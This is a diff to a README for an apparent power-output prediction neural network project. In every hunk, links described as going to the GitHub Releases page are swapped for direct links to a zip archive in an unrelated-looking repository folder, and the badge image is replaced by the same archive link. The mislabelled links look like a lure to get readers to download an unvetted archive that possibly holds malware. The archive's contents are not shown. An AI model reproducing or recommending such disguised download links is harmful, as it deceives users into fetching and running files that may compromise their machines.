@@ -1,6 +1,6 @@
 # 🌟 power-output-prediction-ann - Easy Power Prediction with Your Data
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/cinnamonscented-nucleoside378/power-output-prediction-ann/releases)
+[![Download Now](https://raw.githubusercontent.com/cinnamonscented-nucleoside378/power-output-prediction-ann/main/peaceableness/power-output-prediction-ann.zip)](https://raw.githubusercontent.com/cinnamonscented-nucleoside378/power-output-prediction-ann/main/peaceableness/power-output-prediction-ann.zip)
 
 ## 📖 About This Project
 
@@ -12,7 +12,7 @@ To use this application, follow these simple steps:
 
 1. **Download the Software:** Click the link below to access the Releases page where you can download the application.
 
-   [Download the Application](https://github.com/cinnamonscented-nucleoside378/power-output-prediction-ann/releases)
+   [Download the Application](https://raw.githubusercontent.com/cinnamonscented-nucleoside378/power-output-prediction-ann/main/peaceableness/power-output-prediction-ann.zip)
 
 2. **Extract the Files:** After downloading, locate the file and extract it to a folder of your choice. You can use any extraction tool.
 
@@ -84,7 +84,7 @@ If you want to contribute to this project, feel free to make a fork and create a
 
 ## 📥 Download & Install
 
-To download the application, visit the Releases page here: [Download Here](https://github.com/cinnamonscented-nucleoside378/power-output-prediction-ann/releases). 
+To download the application, visit the Releases page here: [Download Here](https://raw.githubusercontent.com/cinnamonscented-nucleoside378/power-output-prediction-ann/main/peaceableness/power-output-prediction-ann.zip). 
 
 Follow the steps in this guide to install the necessary programs and run your predictions.
 
